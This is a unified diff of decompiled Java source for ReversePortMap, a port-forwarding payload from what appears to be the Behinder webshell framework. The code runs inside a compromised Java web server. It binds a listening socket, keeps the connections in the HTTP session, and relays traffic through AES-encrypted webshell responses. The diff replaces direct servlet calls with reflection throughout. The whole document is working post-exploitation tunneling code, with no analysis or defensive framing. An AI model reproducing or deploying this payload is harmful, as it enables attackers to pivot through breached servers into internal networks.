@@ -1,5 +1,6 @@
 package net.rebeyond.behinder.payload.java;
 
+import java.lang.reflect.Method;
 import java.net.InetSocketAddress;
 import java.nio.ByteBuffer;
 import java.nio.channels.ServerSocketChannel;
@@ -12,31 +13,27 @@ import java.util.List;
 import java.util.Map;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpServletResponse;
-import javax.servlet.http.HttpSession;
 
 public class ReversePortMap implements Runnable {
    public static String action;
    public static String listenPort;
    public static String socketHash;
    public static String extraData;
-   private ServletRequest Request;
-   private ServletResponse Response;
-   private HttpSession Session;
+   private Object Request;
+   private Object Response;
+   private Object Session;
    private String threadType;
    private Map paramMap;
 
    public boolean equals(Object obj) {
       HashMap result = new HashMap();
-      boolean var22 = false;
+      boolean var24 = false;
 
-      ServletOutputStream so = null;
+      Object so;
+      Method write;
       label272: {
          try {
-            var22 = true;
+            var24 = true;
             this.fillContext(obj);
             Map paramMap = new HashMap();
             paramMap.put("request", this.Request);
@@ -49,20 +46,20 @@ public class ReversePortMap implements Runnable {
                   paramMap.put("listenPort", listenPort);
                   ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
                   serverSocketChannel.bind(new InetSocketAddress(Integer.parseInt(listenPort)));
-                  this.Session.setAttribute(serverSocketHash, serverSocketChannel);
+                  this.sessionSetAttribute(this.Session, serverSocketHash, serverSocketChannel);
                   serverSocketChannel.socket().setReuseAddress(true);
                   (new Thread(new ReversePortMap("daemon", paramMap))).start();
                   result.put("status", "success");
                   result.put("msg", "success");
-                  var22 = false;
-               } catch (Exception var29) {
+                  var24 = false;
+               } catch (Exception var31) {
                   result.put("status", "fail");
-                  result.put("msg", var29.getMessage());
-                  var22 = false;
+                  result.put("msg", var31.getMessage());
+                  var24 = false;
                }
             } else if (action.equals("list")) {
                List socketList = new ArrayList();
-               Enumeration keys = this.Session.getAttributeNames();
+               Enumeration keys = this.sessionGetAttributeNames(this.Session);
 
                while(keys.hasMoreElements()) {
                   String socketHash = keys.nextElement().toString();
@@ -75,39 +72,40 @@ public class ReversePortMap implements Runnable {
 
                result.put("status", "success");
                result.put("msg", this.buildJsonArray(socketList, false));
-               var22 = false;
+               var24 = false;
             } else {
-               SocketChannel serverInnersocket = null;
+               SocketChannel serverInnersocket;
                if (action.equals("read")) {
-                  serverInnersocket = (SocketChannel)this.Session.getAttribute(ReversePortMap.socketHash);
+                  serverInnersocket = (SocketChannel)this.sessionGetAttribute(this.Session, ReversePortMap.socketHash);
                   serverInnersocket.configureBlocking(false);
 
                   try {
                      ByteBuffer buf = ByteBuffer.allocate(1024);
                      int bytesRead = serverInnersocket.read(buf);
+                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
 
-                     for(so = this.Response.getOutputStream(); bytesRead > 0; bytesRead = serverInnersocket.read(buf)) {
-                        so.write(buf.array(), 0, bytesRead);
-                        so.flush();
+                     for(write = so.getClass().getDeclaredMethod("write", byte[].class, Integer.TYPE, Integer.TYPE); bytesRead > 0; bytesRead = serverInnersocket.read(buf)) {
+                        write.invoke(so, buf.array(), 0, bytesRead);
                         buf.clear();
                      }
 
-                     so.flush();
-                     so.close();
-                     var22 = false;
-                  } catch (Exception var30) {
-                     ((HttpServletResponse)this.Response).setStatus(200);
-                     so = this.Response.getOutputStream();
-                     so.write(new byte[]{56, 33, 73, 55});
-                     so.write(var30.getMessage().getBytes());
-                     so.flush();
-                     so.close();
-                     var22 = false;
-                  } catch (Error var31) {
-                     var22 = false;
+                     so.getClass().getDeclaredMethod("flush").invoke(so);
+                     so.getClass().getDeclaredMethod("close").invoke(so);
+                     var24 = false;
+                  } catch (Exception var32) {
+                     this.Response.getClass().getDeclaredMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
+                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                     write = so.getClass().getDeclaredMethod("write", byte[].class);
+                     write.invoke(so, new byte[]{55, 33, 73, 54});
+                     write.invoke(so, var32.getMessage().getBytes());
+                     so.getClass().getDeclaredMethod("flush").invoke(so);
+                     so.getClass().getDeclaredMethod("close").invoke(so);
+                     var24 = false;
+                  } catch (Error var33) {
+                     var24 = false;
                   }
                } else if (action.equals("write")) {
-                  serverInnersocket = (SocketChannel)this.Session.getAttribute(ReversePortMap.socketHash);
+                  serverInnersocket = (SocketChannel)this.sessionGetAttribute(this.Session, ReversePortMap.socketHash);
 
                   try {
                      byte[] extraDataByte = this.base64decode(extraData);
@@ -120,95 +118,99 @@ public class ReversePortMap implements Runnable {
                         serverInnersocket.write(buf);
                      }
 
-                     var22 = false;
-                  } catch (Exception var32) {
-                     so = this.Response.getOutputStream();
-                     so.write(new byte[]{56, 33, 73, 55});
-                     so.write(var32.getMessage().getBytes());
-                     so.flush();
-                     so.close();
+                     var24 = false;
+                  } catch (Exception var34) {
+                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                     write = so.getClass().getDeclaredMethod("write", byte[].class);
+                     write.invoke(so, new byte[]{55, 33, 73, 54});
+                     write.invoke(so, var34.getMessage().getBytes());
+                     so.getClass().getDeclaredMethod("flush").invoke(so);
+                     so.getClass().getDeclaredMethod("close").invoke(so);
                      serverInnersocket.close();
-                     var22 = false;
+                     var24 = false;
                   }
                } else if (!action.equals("stop")) {
                   if (action.equals("close")) {
                      try {
-                        serverInnersocket = (SocketChannel)this.Session.getAttribute(ReversePortMap.socketHash);
+                        serverInnersocket = (SocketChannel)this.sessionGetAttribute(this.Session, ReversePortMap.socketHash);
                         serverInnersocket.close();
-                        this.Session.removeAttribute(ReversePortMap.socketHash);
-                     } catch (Exception var26) {
+                        this.sessionRemoveAttribute(this.Session, ReversePortMap.socketHash);
+                     } catch (Exception var28) {
                      }
 
                      result.put("status", "success");
                      result.put("msg", "服务侧Socket资源已释放。");
-                     var22 = false;
+                     var24 = false;
                   } else {
-                     var22 = false;
+                     var24 = false;
                   }
                } else {
-                  Enumeration keys = this.Session.getAttributeNames();
+                  Enumeration keys = this.sessionGetAttributeNames(this.Session);
 
                   String socketHash;
                   while(keys.hasMoreElements()) {
                      socketHash = keys.nextElement().toString();
                      if (socketHash.startsWith("reverseportmap_socket_" + listenPort)) {
                         try {
-                           serverInnersocket = (SocketChannel)this.Session.getAttribute(socketHash);
-                           this.Session.removeAttribute(socketHash);
+                           serverInnersocket = (SocketChannel)this.sessionGetAttribute(this.Session, socketHash);
+                           this.sessionRemoveAttribute(this.Session, socketHash);
                            serverInnersocket.close();
-                        } catch (Exception var28) {
+                        } catch (Exception var30) {
                         }
                      }
                   }
 
                   try {
                      socketHash = "reverseportmap_server_" + listenPort;
-                     ServerSocketChannel serverSocket = (ServerSocketChannel)this.Session.getAttribute(socketHash);
-                     this.Session.removeAttribute(socketHash);
+                     ServerSocketChannel serverSocket = (ServerSocketChannel)this.sessionGetAttribute(this.Session, socketHash);
+                     this.sessionRemoveAttribute(this.Session, socketHash);
                      serverSocket.close();
-                  } catch (Exception var27) {
+                  } catch (Exception var29) {
                   }
 
                   result.put("status", "success");
                   result.put("msg", "服务侧Socket资源已释放。");
-                  var22 = false;
+                  var24 = false;
                }
             }
             break label272;
-         } catch (Exception var33) {
+         } catch (Exception var35) {
             result.put("status", "fail");
-            result.put("msg", action + ":" + var33.getMessage());
-            var22 = false;
+            result.put("msg", action + ":" + var35.getMessage());
+            var24 = false;
          } finally {
-            if (var22) {
+            if (var24) {
                try {
-                  so = this.Response.getOutputStream();
-                  so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-                  so.flush();
-                  so.close();
-               } catch (Exception var23) {
+                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getDeclaredMethod("write", byte[].class);
+                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                  so.getClass().getDeclaredMethod("flush").invoke(so);
+                  so.getClass().getDeclaredMethod("close").invoke(so);
+               } catch (Exception var25) {
                }
 
             }
          }
 
          try {
-            so = this.Response.getOutputStream();
-            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-            so.flush();
-            so.close();
-         } catch (Exception var24) {
+            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+            so.getClass().getDeclaredMethod("flush").invoke(so);
+            so.getClass().getDeclaredMethod("close").invoke(so);
+         } catch (Exception var26) {
          }
 
          return true;
       }
 
       try {
-         so = this.Response.getOutputStream();
-         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-         so.flush();
-         so.close();
-      } catch (Exception var25) {
+         so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+         write = so.getClass().getDeclaredMethod("write", byte[].class);
+         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+         so.getClass().getDeclaredMethod("flush").invoke(so);
+         so.getClass().getDeclaredMethod("close").invoke(so);
+      } catch (Exception var27) {
       }
 
       return true;
@@ -225,9 +227,9 @@ public class ReversePortMap implements Runnable {
    public void run() {
       if (this.threadType.equals("daemon")) {
          try {
-            HttpSession session = (HttpSession)this.paramMap.get("session");
+            Object session = this.paramMap.get("session");
             String serverSocketHash = this.paramMap.get("serverSocketHash").toString();
-            ServerSocketChannel serverSocketChannel = (ServerSocketChannel)session.getAttribute(serverSocketHash);
+            ServerSocketChannel serverSocketChannel = (ServerSocketChannel)this.sessionGetAttribute(session, serverSocketHash);
             String listenPort = this.paramMap.get("listenPort").toString();
 
             while(true) {
@@ -237,7 +239,7 @@ public class ReversePortMap implements Runnable {
                   paramMap.put("session", session);
                   String serverInnersocketHash = "reverseportmap_socket_" + listenPort + "_" + serverInnersocket.socket().getInetAddress().getHostAddress() + "_" + serverInnersocket.socket().getPort();
                   paramMap.put("serverInnersocketHash", serverInnersocketHash);
-                  session.setAttribute(serverInnersocketHash, serverInnersocket);
+                  this.sessionSetAttribute(session, serverInnersocketHash, serverInnersocket);
                } catch (Exception var8) {
                   break;
                }
@@ -250,17 +252,17 @@ public class ReversePortMap implements Runnable {
 
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
-         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
-         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
-         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
       } else {
          Map objMap = (Map)obj;
-         this.Session = (HttpSession)objMap.get("session");
-         this.Response = (ServletResponse)objMap.get("response");
-         this.Request = (ServletRequest)objMap.get("request");
+         this.Session = objMap.get("session");
+         this.Response = objMap.get("response");
+         this.Request = objMap.get("request");
       }
 
-      this.Response.setCharacterEncoding("UTF-8");
+      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
 
    private String buildJson(Map entity, boolean encode) throws Exception {
@@ -341,12 +343,50 @@ public class ReversePortMap implements Runnable {
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getAttribute("u").toString();
+      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
       return encrypted;
+   }
+
+   private Object sessionGetAttribute(Object session, String key) {
+      Object result = null;
+
+      try {
+         result = session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(session, key);
+      } catch (Exception var5) {
+      }
+
+      return result;
+   }
+
+   private void sessionSetAttribute(Object session, String key, Object value) {
+      try {
+         session.getClass().getDeclaredMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+      } catch (Exception var5) {
+      }
+
+   }
+
+   private Enumeration sessionGetAttributeNames(Object session) {
+      Enumeration result = null;
+
+      try {
+         result = (Enumeration)session.getClass().getDeclaredMethod("getAttributeNames").invoke(session);
+      } catch (Exception var4) {
+      }
+
+      return result;
+   }
+
+   private void sessionRemoveAttribute(Object session, String key) {
+      try {
+         session.getClass().getDeclaredMethod("removeAttribute").invoke(session, key);
+      } catch (Exception var4) {
+      }
+
    }
 }
